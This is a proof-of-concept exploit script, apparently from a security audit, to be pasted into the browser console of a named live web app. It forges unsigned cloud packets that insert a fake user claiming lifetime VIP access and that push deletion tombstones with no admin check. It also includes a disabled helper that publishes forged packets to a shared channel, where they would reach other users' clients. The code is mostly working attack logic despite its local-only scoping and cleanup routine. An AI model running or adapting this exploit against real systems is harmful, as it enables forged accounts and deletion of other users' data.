// poc_new02_packet_injection.js — NEW-02: unsigned cloud packet injection
//                                (ACTION — applies a forged packet locally)
//   Companion: F-01 tombstone / cross-client propagation (READ-ONLY part)
//
// Target:  https://trithuc500.vercel.app/
// Findings:
//   NEW-02 — `processIncomingCloudPacket` accepts a packet with no
//            `fromAdmin` and no `adminSig`. The V4.4 build (lines 3637-3653)
//            downgrades such packets to `pending` / non-VIP for *new* users —
//            a genuine hardening — but the packet still reaches the merge
//            path, and the tombstone table (`deletedMap` /
//            `deletedUsernames`) is merged UNCONDITIONALLY, with no admin
//            check at all (lines 3587-3614).
//   F-01   — that tombstone merge is what deletes users from other clients'
//            local state. This PoC shows the merge locally only.
//
// Type:     ACTION, LOCAL ONLY by default.
//
// SCOPE / SAFETY:
//   - The forged packet is applied to THIS browser's state via
//     `__TRITHUC50_CLOUD_BUS__.applyIncomingPacket`.
//   - Nothing is published to ntfy.sh / keyvalue.immanuel.co.
//   - The live-publish helper is provided but is DISABLED and requires an
//     explicit URL argument, so it cannot fire by accident.
//   - Use `__AERO_NEW02_CLEANUP__()` to remove the synthetic user.
//
// Usage: paste into DevTools Console on the target page.

(() => {
    'use strict';

    const K_USERS = 'TRITHUC50_USERS_V436_CLEAN';
    const STAMP = String(Date.now()).slice(-6);
    const NAME = 'sinhvien' + STAMP;

    console.log('=== NEW-02 unsigned packet injection (LOCAL ONLY) ===');

    // ---- 1. Build an unsigned, non-admin packet with a synthetic user. ----
    // Field names match the shipped serializeCompactUser() (line 3367):
    //   id, u, p, n, c, s, g, ph, st, vp, rp, pl, rpl, exp, pend, newReg,
    //   maxD, devs, regAt, updAt, seal, bkt, v436
    const now = Date.now();
    const forged = {
        app: 'TRITHUC50_V436',
        type: 'LOCAL_POC_NEW02',
        ts: now,
        fromAdmin: false,          // no admin claim
        adminSig: '',              // no signature
        hideAuthorInfo: false,
        hideAuthorTs: 0,
        deletedUsernames: [],
        deletedMap: {},
        users: [{
            id: 'stu_' + NAME,
            u: NAME,
            p: 'SYNTHETIC_POC_ONLY',
            n: 'Sinh vien ' + STAMP,
            c: '12A1',
            s: '01',
            g: NAME + '@example.edu.vn',
            ph: '',
            st: 'active',
            vp: [1, 1, 1, 1],
            rp: [1, 1, 1, 1],
            pl: 'lifetime',
            rpl: 'lifetime',
            exp: null,
            pend: 0,
            newReg: 0,
            maxD: 2,
            devs: [],
            regAt: 'POC',
            updAt: now,
            seal: '',
            bkt: '',
            v436: 1
        }]
    };

    console.table({
        packetType: forged.type,
        fromAdmin: forged.fromAdmin,
        hasAdminSig: !!forged.adminSig,
        injectedUser: forged.users[0].u,
        claimedStatus: forged.users[0].st,
        claimedVp: forged.users[0].vp.join(''),
        scope: 'local apply only'
    });

    // ---- 2. Apply it through the real ingestion path. --------------------
    const bus = window.__TRITHUC50_CLOUD_BUS__;
    if (!bus || typeof bus.applyIncomingPacket !== 'function') {
        return console.error('[NEW-02] cloud bus not available on this build');
    }

    const accepted = bus.applyIncomingPacket(forged);
    console.log('[NEW-02] processIncomingCloudPacket returned:', accepted);

    // ---- 3. Inspect what the merge actually did. -------------------------
    const stored = JSON.parse(localStorage.getItem(K_USERS) || '[]');
    const hit = stored.find(u => String(u.username || '').toLowerCase() === NAME.toLowerCase());

    const result = {
        packetAccepted: accepted === true,
        userPersisted: !!hit,
        resultingStatus: hit ? hit.status : null,
        resultingIsVip: hit ? hit.isVip === true : null,
        resultingVipPlan: hit ? hit.vipPlan : null,
        resultingVp: hit && hit.vipPackages
            ? Object.keys(hit.vipPackages).filter(k => hit.vipPackages[k]).join(',')
            : null
    };
    console.table(result);

    if (result.userPersisted && result.resultingStatus === 'pending' && !result.resultingIsVip) {
        console.log('[NEW-02] V4.4 HARDENING OBSERVED: the unsigned packet was downgraded to');
        console.log('         pending / non-VIP. The user record still landed in the local');
        console.log('         table, which is the residual issue (an unauthenticated peer can');
        console.log('         insert records into every client\'s local list).');
        console.log('[NEW-02] NEW-02 severity reduced for the VIP-grant path on V4.4.');
    } else if (result.resultingIsVip) {
        console.warn('[NEW-02] unsigned packet still grants VIP on this build.');
    }

    // ---- 4. Tombstone merge: the unauthenticated part. -------------------
    // NEW-02 note: the tombstone table is merged WITHOUT any admin check.
    const tombstoneDemo = {
        app: 'TRITHUC50_V436',
        type: 'LOCAL_POC_TOMBSTONE',
        ts: now,
        fromAdmin: false,
        adminSig: '',
        deletedUsernames: [],
        deletedMap: { 'demo_user_not_real': now },
        users: []
    };
    const tAccepted = bus.applyIncomingPacket(tombstoneDemo);
    console.log(`[NEW-02] unsigned tombstone packet accepted: ${tAccepted} ` +
                '(no admin signature required for deletedMap merge)');

    // ---- 5. Optional live publish (disabled by default). ------------------
    // Publishing to a shared production channel affects OTHER users' clients.
    // It requires an explicit URL and is never called automatically.
    window.__AERO_NEW02_PUBLISH__ = async function (explicitUrl, packet) {
        if (!explicitUrl || !/^https:\/\//.test(String(explicitUrl))) {
            return console.error('[NEW-02] an explicit https URL is required. ' +
                'Publishing to a shared channel affects other users — use a staging topic only.');
        }
        const body = 'TT50V436:' + btoa(unescape(encodeURIComponent(JSON.stringify(packet))))
            .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        const resp = await fetch(explicitUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
            body
        });
        console.log('[NEW-02] published, HTTP', resp.status);
        return resp.status;
    };
    console.log('[NEW-02] live publish helper is present but NOT called. ' +
                'Use __AERO_NEW02_PUBLISH__(explicitUrl, packet) against a staging topic only.');

    // ---- 6. Cleanup. ------------------------------------------------------
    window.__AERO_NEW02_CLEANUP__ = function () {
        const raw = localStorage.getItem(K_USERS);
        if (!raw) return console.warn('[NEW-02] no user store');
        const arr = JSON.parse(raw).filter(u => String(u.username || '').toLowerCase() !== NAME.toLowerCase());
        localStorage.setItem(K_USERS, JSON.stringify(arr));
        console.log('[NEW-02] synthetic user removed. Press F5.');
        return true;
    };
    console.log('Cleanup: __AERO_NEW02_CLEANUP__() then F5');

    return {
        packetAccepted: result.packetAccepted,
        userPersisted: result.userPersisted,
        resultingStatus: result.resultingStatus,
        resultingIsVip: result.resultingIsVip,
        tombstoneAcceptedWithoutAdminSig: tAccepted === true,
        cleanup: '__AERO_NEW02_CLEANUP__()'
    };
})();
